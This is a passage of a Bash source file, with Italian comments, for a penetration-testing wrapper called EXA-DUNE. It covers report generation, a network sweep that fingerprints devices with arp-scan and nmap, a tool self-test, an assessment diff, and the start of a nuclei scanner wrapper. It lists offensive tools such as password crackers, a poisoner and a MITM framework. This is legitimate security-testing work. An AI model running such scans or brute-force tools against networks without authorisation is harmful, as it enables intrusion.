                ttime=$(echo "$tline" | grep -oP '^\[[0-9:]+\]' | tr -d '[]')
                tmsg=$(echo "$tline" | sed 's/^\[[0-9:]*\] //' | sed 's/</\&lt;/g;s/>/\&gt;/g')
                local tcolor="#c9d1d9"
                echo "$tmsg" | grep -qi "START\|PIPELINE START" && tcolor="#56d364"
                echo "$tmsg" | grep -qi "END\|COMPLETAT" && tcolor="#58a6ff"
                echo "$tmsg" | grep -qi "SKIP\|SALTA" && tcolor="#8b949e"
                echo "<tr><td style='font-family:monospace;color:#8b949e'>$ttime</td><td style='color:$tcolor'>$tmsg</td></tr>"
            done < "$timeline_f"
            echo "</table>"
        else
            # Timeline sintetica dai moduli (senza file timeline)
            echo "<table><tr><th>Modulo</th><th>File Output</th><th>Findings</th></tr>"
            find "$outdir" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort | while IFS= read -r d; do
                local mod; mod=$(basename "$d")
                local fcount; fcount=$(find "$d" -type f 2>/dev/null | wc -l)
                local fnd; fnd=$(find "$d" -name "findings.txt" -exec wc -l {} \; 2>/dev/null | awk '{print $1}' || echo 0)
                local tmod_color="#56d364"; [[ $fcount -eq 0 ]] && tmod_color="#8b949e"
                echo "<tr><td style='color:$tmod_color'><strong>$mod</strong></td><td>$fcount file</td><td>${fnd:-0}</td></tr>"
            done
            echo "</table>"
        fi

        # 9. APPENDICE — LOG
        echo "<h1 class='page-break'>9. Appendice — Log Completo</h1>"
        echo "<pre>"
        # Cerca pipeline.log, master.log o exa-dune.log
        local log_f
        log_f=$(find "$outdir" -maxdepth 1 \( -name "pipeline.log" -o -name "master.log" -o -name "exa-dune.log" \) 2>/dev/null | head -1)
        if [[ -n "$log_f" && -s "$log_f" ]]; then
            sed 's/</\&lt;/g;s/>/\&gt;/g' "$log_f" | head -300
        else
            echo "(nessun log disponibile — eseguire tramite pipeline per log completo)"
        fi
        echo "</pre>"

        # FOOTER
        echo "<div class='footer'>"
        echo "  <span>EXA-DUNE v${VERSION} — Generato il $(date '+%d/%m/%Y %H:%M')</span>"
        echo "  <span>Target: $(echo "$target" | sed 's/</\&lt;/g;s/>/\&gt;/g')</span>"
        echo "  <span style='color:#b91c1c;font-weight:bold'>CONFIDENZIALE</span>"
        echo "</div>"
        echo "</body></html>"

        } > "$html_file"
        ok "Report HTML salvato: $html_file"

        if [[ $do_pdf -eq 1 ]]; then
            local pdf_file="${html_file%.html}.pdf"
            local pdf_cmd
            if pdf_cmd=$(_ensure_pdf_tool 2>/dev/null); then
                if [[ $DRY_RUN -eq 1 ]]; then
                    echo -e "${CYAN}[DRY-RUN]${NC} $pdf_cmd $html_file $pdf_file"
                elif [[ "$pdf_cmd" == "wkhtmltopdf" ]]; then
                    wkhtmltopdf --quiet \
                        --page-size A4 \
                        --margin-top 15mm --margin-bottom 15mm \
                        --margin-left 12mm --margin-right 12mm \
                        --title "EXA-DUNE Report — $target" \
                        "$html_file" "$pdf_file" 2>/dev/null \
                        && ok "Report PDF salvato: $pdf_file" \
                        || warn "wkhtmltopdf fallito — solo HTML disponibile"
                elif [[ "$pdf_cmd" == "weasyprint" ]]; then
                    weasyprint "$html_file" "$pdf_file" 2>/dev/null \
                        && ok "Report PDF salvato: $pdf_file" \
                        || warn "weasyprint fallito — solo HTML disponibile"
                else
                    # chromium/chrome headless
                    $pdf_cmd="$pdf_file" "$html_file" 2>/dev/null \
                        && ok "Report PDF salvato: $pdf_file" \
                        || warn "Chromium headless fallito — solo HTML disponibile"
                fi
            else
                warn "Nessun tool PDF disponibile — installa: apt install wkhtmltopdf"
            fi
            # Auto-copy PDF su Desktop
            if [[ -f "$pdf_file" ]]; then
                _init_reports_dir
                local desk_name
                desk_name="REPORT_$(echo "$target" | tr '.' '-')_$(date +%Y%m%d_%H%M%S).pdf"
                cp "$pdf_file" "$EXA_REPORTS_DIR/$desk_name" 2>/dev/null && \
                    ok "Report copiato su Desktop: $EXA_REPORTS_DIR/$desk_name"
            fi
        fi
    fi
}

# ============================================================
#  SUBCOMMAND: network-sweep
# ============================================================
usage_network_sweep() {
    echo "Uso: exa-dune network-sweep <CIDR> [OPTIONS]"
    echo ""
    echo "  Sweep di rete: arp-scan → nmap veloce → fingerprinting device → tabella riepilogativa"
    echo ""
    echo "Opzioni:"
    echo "  --iface IFACE      Interfaccia di rete (default: auto-detect)"
    echo "  --auto             Lancia auto-profiling su ogni host trovato"
    echo "  --output DIR       Directory output (default: auto-generata)"
    echo "  --dry-run          Mostra comandi senza eseguirli"
    echo "  --timeout N        Timeout secondi per nmap per host (default: 30)"
    echo ""
    echo "Tipi device rilevati automaticamente:"
    echo "  voip-gateway   — porte 5060/5061/2000"
    echo "  ip-camera      — porte 554/8554/8000"
    echo "  mqtt-broker    — porta 1883"
    echo "  embedded-device — porta 23 (telnet)"
    echo "  generic        — default"
}

cmd_network_sweep() {
    local cidr="" iface="" do_auto=0 outdir="" sweep_timeout=30
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --iface)   _req_arg "$1" "${2:-}"; iface="$2";      shift 2 ;;
            --auto)    do_auto=1;              shift ;;
            --output)  _req_arg "$1" "${2:-}"; outdir="$2";     shift 2 ;;
            --dry-run) DRY_RUN=1;             shift ;;
            --timeout) _req_arg "$1" "${2:-}"; sweep_timeout="$2"; shift 2 ;;
            --help|-h) usage_network_sweep; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_network_sweep; exit 1 ;;
            *)         cidr="$1"; shift ;;
        esac
    done
    [[ -z "$cidr" ]] && { err "CIDR mancante (es: 192.168.1.0/24)"; usage_network_sweep; exit 1; }
    check_root

    local ts; ts=$(date +%Y%m%d_%H%M%S)
    outdir="${outdir:-/root/pentest/exa-dune-sweep_${ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$outdir"
    local sweep_log="$outdir/sweep.log"
    [[ $DRY_RUN -eq 0 ]] && _log_file="$sweep_log" || _log_file=""

    log "Network Sweep: $cidr | Output: $outdir"

    # ── Rileva interfaccia ──────────────────────────────────────────────────
    if [[ -z "$iface" ]]; then
        iface=$(ip route show | grep -oP 'dev \K\S+' | head -1 2>/dev/null || echo "eth0")
        log "Interfaccia auto-rilevata: $iface"
    fi

    # ── ARP Scan ────────────────────────────────────────────────────────────
    section "ARP Scan — $cidr"
    local arp_out="$outdir/arp_sweep.txt"
    if [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} arp-scan -I $iface $cidr"
    else
        if require_tool arp-scan; then
            arp-scan -I "$iface" "$cidr" 2>/dev/null | tee "$arp_out" || true
        else
            warn "arp-scan non disponibile — uso nmap ping sweep come fallback"
            nmap -sn "$cidr" -oG "$arp_out" 2>/dev/null || true
        fi
    fi

    # ── Estrai host vivi ────────────────────────────────────────────────────
    local live_hosts=()
    if [[ $DRY_RUN -eq 0 && -f "$arp_out" ]]; then
        # Da arp-scan: righe con IP e MAC
        while IFS= read -r line; do
            local ip; ip=$(echo "$line" | grep -oP '^\d{1,3}(\.\d{1,3}){3}' | head -1 || true)
            [[ -n "$ip" ]] && live_hosts+=("$ip")
        done < <(grep -E '^[0-9]+\.' "$arp_out" 2>/dev/null | grep -v "^Starting\|^Ending\|^Interface\|^ARP" || true)
        # Fallback da nmap -sn output gnmap
        if [[ ${#live_hosts[@]} -eq 0 ]]; then
            while IFS= read -r line; do
                local ip; ip=$(echo "$line" | grep -oP 'Host: \K\d{1,3}(\.\d{1,3}){3}' | head -1 || true)
                [[ -n "$ip" ]] && live_hosts+=("$ip")
            done < <(grep "Status: Up" "$arp_out" 2>/dev/null || true)
        fi
    elif [[ $DRY_RUN -eq 1 ]]; then
        live_hosts=("192.168.1.1" "192.168.1.10")  # esempio dry-run
    fi

    log "Host vivi rilevati: ${#live_hosts[@]}"

    # ── Nmap veloce + fingerprinting ────────────────────────────────────────
    section "Nmap veloce + fingerprinting host"
    local results=()  # Ogni entry: "IP|MAC|TIPO|PORTE|COMANDO"

    for host in "${live_hosts[@]}"; do
        local nmap_f="$outdir/nmap_${host//./-}.nmap"
        local nmap_g="$outdir/nmap_${host//./-}.gnmap"

        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} nmap -sV --top-ports 100 --host-timeout ${sweep_timeout}s -oN $nmap_f $host"
            local dev_type="generic"
            results+=("$host|XX:XX:XX:XX:XX:XX|$dev_type|(dry-run)|exa-dune auto $host --profile $dev_type")
            continue
        fi

        log "Scanning $host ..."
        nmap -sV --top-ports 100 \
            --host-timeout "${sweep_timeout}s" \
            $NMAP_TIMING \
            -oN "$nmap_f" -oG "$nmap_g" \
            "$host" 2>/dev/null || true

        # Estrai porte aperte
        local open_ports=""
        [[ -f "$nmap_f" ]] && open_ports=$(grep -E "^[0-9]+/tcp.*open" "$nmap_f" | awk '{print $1}' | tr '\n' ',' | sed 's/,$//' || true)

        # Estrai MAC da arp output
        local mac="N/A"
        mac=$(grep -w "$host" "$arp_out" 2>/dev/null | awk '{print $2}' | head -1 || echo "N/A")

        # Fingerprinting tipo device
        local dev_type="generic"
        # Verifica porte caratteristiche
        echo "$open_ports" | grep -qE "5060|5061|2000" && dev_type="voip-gateway"
        [[ "$dev_type" == "generic" ]] && echo "$open_ports" | grep -qE "554|8554|8000" && dev_type="ip-camera"
        [[ "$dev_type" == "generic" ]] && echo "$open_ports" | grep -q "1883"            && dev_type="mqtt-broker"
        [[ "$dev_type" == "generic" ]] && echo "$open_ports" | grep -q "23/"             && dev_type="embedded-device"

        local cmd_sug="exa-dune auto $host --profile $dev_type"
        [[ "$dev_type" == "mqtt-broker" ]] && cmd_sug="exa-dune mqtt $host"

        results+=("$host|$mac|$dev_type|$open_ports|$cmd_sug")
        ok "  $host → tipo: $dev_type | porte: ${open_ports:-nessuna}"
    done

    # ── Tabella riepilogativa ───────────────────────────────────────────────
    section "Tabella Riepilogativa Sweep"
    echo ""
    printf "${BOLD}%-17s %-19s %-16s %-30s %s${NC}\n" "IP" "MAC" "TIPO" "PORTE APERTE" "COMANDO SUGGERITO"
    printf '%0.s─' {1..110}; echo
    local results_file="$outdir/sweep_results.txt"
    [[ $DRY_RUN -eq 0 ]] && printf "%-17s %-19s %-16s %-30s %s\n" "IP" "MAC" "TIPO" "PORTE APERTE" "COMANDO SUGGERITO" > "$results_file"

    for entry in "${results[@]}"; do
        IFS='|' read -r r_ip r_mac r_type r_ports r_cmd <<< "$entry"
        local color="$NC"
        case "$r_type" in
            voip-gateway)   color="$CYAN"   ;;
            ip-camera)      color="$GREEN"  ;;
            mqtt-broker)    color="$YELLOW" ;;
            embedded-device) color="$RED"   ;;
        esac
        local ports_short; ports_short=$(echo "$r_ports" | cut -c1-28)
        printf "${color}%-17s${NC} %-19s %-16s %-30s %s\n" \
            "$r_ip" "$r_mac" "$r_type" "$ports_short" "$r_cmd"
        [[ $DRY_RUN -eq 0 ]] && printf "%-17s %-19s %-16s %-30s %s\n" \
            "$r_ip" "$r_mac" "$r_type" "$r_ports" "$r_cmd" >> "$results_file"
    done
    echo ""

    ok "Risultati sweep salvati: ${results_file:-/dev/null}"

    # ── Auto-profiling ──────────────────────────────────────────────────────
    if [[ $do_auto -eq 1 ]]; then
        section "Auto-profiling su host rilevati"
        for entry in "${results[@]}"; do
            IFS='|' read -r r_ip r_mac r_type r_ports r_cmd <<< "$entry"
            [[ "$r_type" == "mqtt-broker" ]] && continue  # usa cmd diretto
            log "Avvio auto-assessment: $r_ip ($r_type)"
            local auto_outdir="$outdir/auto_${r_ip//./-}"
            if [[ $DRY_RUN -eq 0 ]]; then
                exa-dune auto "$r_ip" --profile "$r_type" --no-tmux --output "$auto_outdir" || true
            else
                echo -e "${CYAN}[DRY-RUN]${NC} exa-dune auto $r_ip --profile $r_type --no-tmux --output $auto_outdir"
            fi
        done
    fi

    ok "Network sweep completato → $outdir"
}

# ============================================================
#  SUBCOMMAND: self-test
# ============================================================
usage_self_test() {
    echo "Uso: exa-dune self-test [OPTIONS]"
    echo ""
    echo "  Verifica la disponibilità di tutti i tool usati da exa-dune."
    echo "  Stampa una tabella: TOOL | STATUS | VERSIONE | PACCHETTO APT"
    echo ""
    echo "Opzioni:"
    echo "  --install-missing  Installa automaticamente i tool mancanti via apt"
    echo "  --dry-run          Mostra cosa verrebbe installato"
}

cmd_self_test() {
    local install_missing=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --install-missing) install_missing=1; shift ;;
            --dry-run)         DRY_RUN=1;         shift ;;
            --help|-h)         usage_self_test; exit 0 ;;
            -*)                err "Opzione sconosciuta: $1"; usage_self_test; exit 1 ;;
            *)                 shift ;;
        esac
    done

    banner
    echo -e "${BOLD}=== exa-dune v${VERSION} — Self-Test Tool Availability ===${NC}"
    echo ""

    # Formato: "comando:pacchetto_apt:descrizione"
    local TOOLS=(
        "nmap:nmap:Port scanner"
        "hydra:hydra:Brute force multi-protocollo"
        "nikto:nikto:Web vulnerability scanner"
        "gobuster:gobuster:Directory/DNS bruteforcer"
        "svmap:sipvicious:SIP scanner (sipvicious)"
        "svwar:sipvicious:SIP war-dialer"
        "svcrack:sipvicious:SIP password cracker"
        "enum4linux:enum4linux:SMB enumeration"
        "smbclient:smbclient:SMB client"
        "snmpwalk:snmp:SNMP walker"
        "mosquitto_sub:mosquitto-clients:MQTT subscriber"
        "searchsploit:exploitdb:Exploit-DB search"
        "arp-scan:arp-scan:ARP network scanner"
        "curl:curl:HTTP client"
        "atftp:atftp:TFTP client"
        "nc:netcat-openbsd:Netcat"
        "testssl:testssl.sh:TLS/SSL scanner"
        "sslscan:sslscan:SSL cipher scanner"
        "dnsrecon:dnsrecon:DNS reconnaissance"
        "ldapsearch:ldap-utils:LDAP query tool"
        "ipmitool:ipmitool:IPMI management"
        "ffuf:ffuf:Web fuzzer"
        "weasyprint:weasyprint:HTML to PDF (Python)"
        "python3:python3:Python 3 interpreter"
        "tmux:tmux:Terminal multiplexer"
        "ffmpeg:ffmpeg:Audio/video processing"
        "avahi-browse:avahi-utils:mDNS/Bonjour browser"
        "dig:dnsutils:DNS lookup"
        "ssh-audit:ssh-audit:SSH audit tool"
        "redis-cli:redis-tools:Redis client"
        "sipsak:sipsak:SIP Swiss Army Knife"
        "nuclei:nuclei:Vulnerability scanner"
        "bettercap:bettercap:MITM framework"
        "responder:responder:LLMNR/MDNS poisoner"
        "ike-scan:ike-scan:IPsec VPN scanner"
        "masscan:masscan:Fast port scanner"
        "hashcat:hashcat:GPU hash cracker"
        "john:john:CPU password cracker"
        "binwalk:binwalk:Firmware analyzer"
        "hping3:hping3:Packet crafting"
        "wafw00f:wafw00f:WAF detector"
        "nxc:netexec:SMB/LDAP multi-tool (netexec)"
        "voiphopper:voiphopper:VoIP VLAN hopper"
        "sippts:sippts:SIP pentest suite"
        "ffuf:ffuf:Fast web fuzzer"
    )

    local available=0 total=0 missing_tools=()

    # Header tabella
    printf "${BOLD}%-20s %-10s %-30s %-25s${NC}\n" "TOOL" "STATUS" "VERSIONE" "PACCHETTO APT"
    printf '%0.s─' {1..90}; echo

    for entry in "${TOOLS[@]}"; do
        IFS=':' read -r tool pkg desc <<< "$entry"
        ((total++)) || true
        local status_str version_str=""

        if command -v "$tool" &>/dev/null; then
            ((available++)) || true
            status_str="${GREEN}OK${NC}"
            # Tenta di recuperare versione
            version_str=$("$tool" --version 2>/dev/null | head -1 | grep -oP '[0-9]+\.[0-9]+[^\s]*' | head -1 || \
                          "$tool" -V 2>/dev/null | head -1 | grep -oP '[0-9]+\.[0-9]+[^\s]*' | head -1 || \
                          echo "n/d")
            version_str="${version_str:0:28}"
        else
            status_str="${RED}MANCANTE${NC}"
            version_str="—"
            missing_tools+=("$tool:$pkg")
        fi

        printf "%-20s ${status_str} %-30s %-25s  # %s\n" \
            "$tool" "$version_str" "$pkg" "$desc"
    done

    echo ""
    printf '%0.s─' {1..90}; echo
    echo -e "${BOLD}Risultato: ${available}/${total} tool disponibili${NC}"
    echo ""

    local missing_count=${#missing_tools[@]}
    if [[ $missing_count -gt 0 ]]; then
        warn "$missing_count tool mancanti:"
        for mt in "${missing_tools[@]}"; do
            IFS=':' read -r mt_cmd mt_pkg <<< "$mt"
            echo "  - $mt_cmd (pacchetto: $mt_pkg)"
        done
        echo ""

        if [[ $install_missing -eq 1 ]]; then
            check_root
            log "Installazione tool mancanti via apt..."
            local apt_pkgs=()
            for mt in "${missing_tools[@]}"; do
                IFS=':' read -r mt_cmd mt_pkg <<< "$mt"
                apt_pkgs+=("$mt_pkg")
            done
            if [[ $DRY_RUN -eq 1 ]]; then
                echo -e "${CYAN}[DRY-RUN]${NC} apt-get install -y ${apt_pkgs[*]}"
            else
                apt-get update -qq 2>/dev/null || true
                apt-get install -y "${apt_pkgs[@]}" 2>/dev/null && \
                    ok "Installazione completata" || \
                    warn "Alcune installazioni potrebbero essere fallite — verifica manualmente"
            fi
        else
            echo -e "  Suggerimento: ${CYAN}exa-dune self-test --install-missing${NC}"
            echo -e "           o:  ${CYAN}exa-dune install${NC}"
        fi
    else
        ok "Tutti i tool sono disponibili!"
    fi
}

# ============================================================
#  SUBCOMMAND: diff
# ============================================================
usage_diff() {
    echo "Uso: exa-dune diff <DIR-OLD> <DIR-NEW> [--pdf]"
    echo ""
    echo "  Confronto differenziale tra due assessment."
    echo "  Calcola: finding nuovi (PEGGIORA), risolti (MIGLIORA), invariati (STABILE)."
    echo "  Confronta anche le porte aperte (da nmap_fast.nmap)."
    echo ""
    echo "Opzioni:"
    echo "  --pdf              Genera PDF del report differenziale"
    echo "  --output DIR       Directory output per il report diff"
    echo "  --dry-run"
}

cmd_diff() {
    local dir_old="" dir_new="" do_pdf=0 diff_outdir=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --pdf)     do_pdf=1;            shift ;;
            --output)  _req_arg "$1" "${2:-}"; diff_outdir="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;           shift ;;
            --help|-h) usage_diff; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_diff; exit 1 ;;
            *)
                if   [[ -z "$dir_old" ]]; then dir_old="$1"
                elif [[ -z "$dir_new" ]]; then dir_new="$1"
                fi
                shift ;;
        esac
    done
    [[ -z "$dir_old" || -z "$dir_new" ]] && { err "Specificare DIR-OLD e DIR-NEW"; usage_diff; exit 1; }
    if [[ $DRY_RUN -eq 0 ]]; then
        [[ ! -d "$dir_old" ]] && { err "Directory OLD non trovata: $dir_old"; exit 1; }
        [[ ! -d "$dir_new" ]] && { err "Directory NEW non trovata: $dir_new"; exit 1; }
    fi

    local ts; ts=$(date +%Y%m%d_%H%M%S)
    diff_outdir="${diff_outdir:-/root/pentest/exa-dune-diff_${ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$diff_outdir"

    log "Diff: OLD=$dir_old | NEW=$dir_new"

    # ── Leggi findings dai due assessment ──────────────────────────────────
    local old_findings=() new_findings=()

    _read_findings_into() {
        local dir="$1" target_arr="$2"
        while IFS= read -r -d '' ffile; do
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                echo "$line" | grep -qP '^\s*[\|#=]|^Nmap|^Starting|^Host is' && continue
                if [[ "$target_arr" == "old_findings" ]]; then
                    old_findings+=("$line")
                else
                    new_findings+=("$line")
                fi
            done < "$ffile"
        done < <(find "$dir" -name "findings.txt" -print0 2>/dev/null | sort -z)
    }

    if [[ $DRY_RUN -eq 0 ]]; then
        _read_findings_into "$dir_old" "old_findings"
        _read_findings_into "$dir_new" "new_findings"
    else
        old_findings=("[HIGH] Vulnerabilità esempio OLD" "[MEDIUM] Altra vulnerabilità OLD")
        new_findings=("[HIGH] Vulnerabilità esempio OLD" "[CRITICAL] Nuova vulnerabilità CRITICAL")
    fi

    # ── Calcola differenze ─────────────────────────────────────────────────
    local new_only=() resolved=() stable=()

    # Finding nuovi (in new ma non in old)
    for f in "${new_findings[@]+"${new_findings[@]}"}"; do
        local found_in_old=0
        for o in "${old_findings[@]+"${old_findings[@]}"}"; do
            [[ "$f" == "$o" ]] && found_in_old=1 && break
        done
        [[ $found_in_old -eq 0 ]] && new_only+=("$f") || stable+=("$f")
    done

    # Finding risolti (in old ma non in new)
    for o in "${old_findings[@]+"${old_findings[@]}"}"; do
        local found_in_new=0
        for f in "${new_findings[@]+"${new_findings[@]}"}"; do
            [[ "$o" == "$f" ]] && found_in_new=1 && break
        done
        [[ $found_in_new -eq 0 ]] && resolved+=("$o")
    done

    # ── Confronta porte aperte ─────────────────────────────────────────────
    local old_ports="" new_ports=""
    local old_nmap; old_nmap=$(find "$dir_old" -maxdepth 2 -name "nmap_fast.nmap" 2>/dev/null | head -1 || true)
    local new_nmap; new_nmap=$(find "$dir_new" -maxdepth 2 -name "nmap_fast.nmap" 2>/dev/null | head -1 || true)
    [[ -n "$old_nmap" && -f "$old_nmap" ]] && old_ports=$(grep -E "^[0-9]+/tcp.*open" "$old_nmap" | awk '{print $1}' | sort | tr '\n' ' ' || true)
    [[ -n "$new_nmap" && -f "$new_nmap" ]] && new_ports=$(grep -E "^[0-9]+/tcp.*open" "$new_nmap" | awk '{print $1}' | sort | tr '\n' ' ' || true)

    # Calcola porte nuove e chiuse
    local ports_opened="" ports_closed=""
    for p in $new_ports; do
        echo "$old_ports" | grep -qw "$p" || ports_opened="$ports_opened $p"
    done
    for p in $old_ports; do
        echo "$new_ports" | grep -qw "$p" || ports_closed="$ports_closed $p"
    done

    # ── Stampa report differenziale ────────────────────────────────────────
    section "REPORT DIFFERENZIALE EXA-DUNE"
    echo ""
    echo -e "${BOLD}OLD:${NC} $dir_old"
    echo -e "${BOLD}NEW:${NC} $dir_new"
    echo -e "${BOLD}Data:${NC} $(date '+%d/%m/%Y %H:%M')"
    echo ""

    # Sommario
    echo -e "${BOLD}${CYAN}═══ SOMMARIO ═══${NC}"
    local overall="STABILE"
    [[ ${#new_only[@]} -gt 0 ]] && overall="${RED}PEGGIORA${NC}"
    [[ ${#new_only[@]} -eq 0 && ${#resolved[@]} -gt 0 ]] && overall="${GREEN}MIGLIORA${NC}"
    echo -e "  Valutazione complessiva: ${BOLD}${overall}${NC}"
    echo -e "  Finding nuovi (PEGGIORA): ${RED}${#new_only[@]}${NC}"
    echo -e "  Finding risolti (MIGLIORA): ${GREEN}${#resolved[@]}${NC}"
    echo -e "  Finding invariati (STABILE): ${YELLOW}${#stable[@]}${NC}"
    echo ""

    # Finding nuovi
    if [[ ${#new_only[@]} -gt 0 ]]; then
        echo -e "${RED}${BOLD}▶ NUOVI FINDING (PEGGIORA) — ${#new_only[@]}${NC}"
        for f in "${new_only[@]}"; do
            echo -e "  ${RED}+${NC} $f"
        done
        echo ""
    fi

    # Finding risolti
    if [[ ${#resolved[@]} -gt 0 ]]; then
        echo -e "${GREEN}${BOLD}▶ FINDING RISOLTI (MIGLIORA) — ${#resolved[@]}${NC}"
        for f in "${resolved[@]}"; do
            echo -e "  ${GREEN}-${NC} $f"
        done
        echo ""
    fi

    # Finding invariati
    if [[ ${#stable[@]} -gt 0 ]]; then
        echo -e "${YELLOW}${BOLD}▶ FINDING INVARIATI (STABILE) — ${#stable[@]}${NC}"
        for f in "${stable[@]}"; do
            echo -e "  ${YELLOW}=${NC} $f"
        done
        echo ""
    fi

    # Porte
    echo -e "${BOLD}${CYAN}═══ PORTE ═══${NC}"
    if [[ -n "$ports_opened" ]]; then
        echo -e "  ${RED}Porte nuove (aperte):${NC}  $ports_opened"
    else
        echo -e "  ${GREEN}Nessuna nuova porta aperta${NC}"
    fi
    if [[ -n "$ports_closed" ]]; then
        echo -e "  ${GREEN}Porte chiuse (risolte):${NC} $ports_closed"
    else
        echo -e "  ${YELLOW}Nessuna porta chiusa${NC}"
    fi
    echo ""

    # Salva report testo
    local diff_report="$diff_outdir/diff_report_${ts}.txt"
    if [[ $DRY_RUN -eq 0 ]]; then
        {
            echo "EXA-DUNE DIFF REPORT"
            echo "OLD: $dir_old"
            echo "NEW: $dir_new"
            echo "Data: $(date)"
            echo "---"
            echo "NUOVI FINDING (${#new_only[@]}):"
            for f in "${new_only[@]}"; do echo "  + $f"; done
            echo "FINDING RISOLTI (${#resolved[@]}):"
            for f in "${resolved[@]}"; do echo "  - $f"; done
            echo "INVARIATI (${#stable[@]}):"
            for f in "${stable[@]}"; do echo "  = $f"; done
            echo "PORTE NUOVE: ${ports_opened:-nessuna}"
            echo "PORTE CHIUSE: ${ports_closed:-nessuna}"
        } > "$diff_report"
        ok "Report diff salvato: $diff_report"
    fi

    # PDF del diff
    if [[ $do_pdf -eq 1 ]]; then
        local html_diff="$diff_outdir/diff_report_${ts}.html"
        {
            echo "<!DOCTYPE html><html lang='it'><head><meta charset='UTF-8'>"
            echo "<style>body{font-family:Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}"
            echo "h1{color:#58a6ff}h2{color:#79c0ff}.new{color:#ff7b72}.resolved{color:#56d364}"
            echo ".stable{color:#e3b341}.confidential{background:#b91c1c;color:#fff;padding:4px 12px}"
            echo "table{width:100%;border-collapse:collapse}th{background:#161b22;color:#58a6ff;padding:6px}"
            echo "td{padding:5px;border-bottom:1px solid #21262d}</style></head><body>"
            echo "<h1>EXA-DUNE — Report Differenziale</h1>"
            echo "<p class='confidential'>CONFIDENZIALE</p>"
            echo "<p><strong>OLD:</strong> $(echo "$dir_old" | sed 's/</\&lt;/g')</p>"
            echo "<p><strong>NEW:</strong> $(echo "$dir_new" | sed 's/</\&lt;/g')</p>"
            echo "<p><strong>Data:</strong> $(date '+%d/%m/%Y %H:%M')</p>"
            echo "<h2>Sommario</h2>"
            echo "<table><tr><th>Categoria</th><th>Conteggio</th></tr>"
            echo "<tr><td class='new'>Nuovi Finding (PEGGIORA)</td><td>${#new_only[@]}</td></tr>"
            echo "<tr><td class='resolved'>Risolti (MIGLIORA)</td><td>${#resolved[@]}</td></tr>"
            echo "<tr><td class='stable'>Invariati (STABILE)</td><td>${#stable[@]}</td></tr>"
            echo "</table>"
            if [[ ${#new_only[@]} -gt 0 ]]; then
                echo "<h2 class='new'>Nuovi Finding</h2><ul>"
                for f in "${new_only[@]}"; do echo "<li class='new'>$(echo "$f" | sed 's/</\&lt;/g')</li>"; done
                echo "</ul>"
            fi
            if [[ ${#resolved[@]} -gt 0 ]]; then
                echo "<h2 class='resolved'>Finding Risolti</h2><ul>"
                for f in "${resolved[@]}"; do echo "<li class='resolved'>$(echo "$f" | sed 's/</\&lt;/g')</li>"; done
                echo "</ul>"
            fi
            echo "<h2>Porte</h2>"
            echo "<p><strong>Nuove porte aperte:</strong> ${ports_opened:-nessuna}</p>"
            echo "<p><strong>Porte chiuse:</strong> ${ports_closed:-nessuna}</p>"
            echo "</body></html>"
        } > "$html_diff"
        ok "HTML diff: $html_diff"

        local pdf_diff="${html_diff%.html}.pdf"
        local pdf_cmd
        if pdf_cmd=$(_ensure_pdf_tool 2>/dev/null); then
            if [[ "$pdf_cmd" == "wkhtmltopdf" ]]; then
                wkhtmltopdf --quiet "$html_diff" "$pdf_diff" 2>/dev/null && ok "PDF diff: $pdf_diff" || warn "PDF non generato"
            elif [[ "$pdf_cmd" == "weasyprint" ]]; then
                weasyprint "$html_diff" "$pdf_diff" 2>/dev/null && ok "PDF diff: $pdf_diff" || warn "PDF non generato"
            fi
            if [[ -f "$pdf_diff" ]]; then
                _init_reports_dir
                local desk_name; desk_name="DIFF_REPORT_${ts}.pdf"
                cp "$pdf_diff" "$EXA_REPORTS_DIR/$desk_name" 2>/dev/null && \
                    ok "PDF diff copiato su Desktop: $EXA_REPORTS_DIR/$desk_name"
            fi
        else
            warn "Nessun tool PDF disponibile — solo HTML salvato"
        fi
    fi

    ok "Diff completato → $diff_outdir"
}

# ============================================================
#  SUBCOMMAND: nuclei — template-based CVE scanner
# ============================================================
usage_nuclei() {
    echo "Uso: exa-dune nuclei <TARGET> [OPTIONS]"
    echo ""
    echo "  Nuclei template-based CVE/misconfiguration scanner"
    echo "  Wraps: nuclei (ProjectDiscovery)"
    echo ""
    echo "  Template categories: iot, network, cves, exposed-panels, default-logins"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta (default: 80)"
    echo "  --scheme SCHEME    http o https (default: http)"
    echo "  --templates CATS   Categorie template separate da virgola (default: iot,cves,exposed-panels,default-logins)"
    echo "  --severity SEVER   Severità minima (default: low,medium,high,critical)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_nuclei() {
    local target="" port=80 scheme="http" templates="iot,cves,exposed-panels,default-logins,network"
    local severity="low,medium,high,critical"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      _req_arg "$1" "${2:-}"; port="$2";       shift 2 ;;
            --scheme)    _req_arg "$1" "${2:-}"; scheme="$2";     shift 2 ;;
            --templates) _req_arg "$1" "${2:-}"; templates="$2";  shift 2 ;;
            --severity)  _req_arg "$1" "${2:-}"; severity="$2";   shift 2 ;;
            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";shift 2 ;;
            --dry-run)   DRY_RUN=1;       shift ;;
            --help|-h)   usage_nuclei; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_nuclei; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_nuclei; exit 1; }
    validate_target "$target"
    validate_port "$port"
    setup_outdir "$target" "nuclei"
    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
    [[ $DRY_RUN -eq 1 ]] && return

    if ! command -v nuclei &>/dev/null; then
        warn "nuclei non trovato — installa: apt install nuclei  o  go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        return 0
    fi

    local nuclei_target="${scheme}://${target}:${port}"
    local tpl_dir="/usr/share/nuclei-templates"
